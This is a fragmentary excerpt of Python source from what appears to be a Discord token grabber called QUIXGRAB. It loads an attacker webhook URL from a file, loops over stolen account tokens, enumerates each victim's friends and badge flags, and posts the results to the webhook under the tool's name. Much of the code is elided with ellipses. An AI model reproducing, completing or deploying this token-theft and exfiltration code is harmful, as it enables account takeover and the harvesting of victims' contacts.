...
webhook = open("webhook.txt", "r", encoding = "utf-8").read()
    ...
    for token in tokens:
        ...
        if friends:
            ...
            for friend in friends:
                ...
                if inds != []:
                    hq_badges = ' '.join([flag[0] for flag in calc_flags(
                        friend['user']['public_flags'])[::-1]])
        ...
        embed.set_footer(text="github.com/cintagram/QUIXGRAB")

        webhook.send(embed=embed, username="QUIXGRAB",
                            avatar_url="https://i.imgur.com/8GnT3ZH.png")             
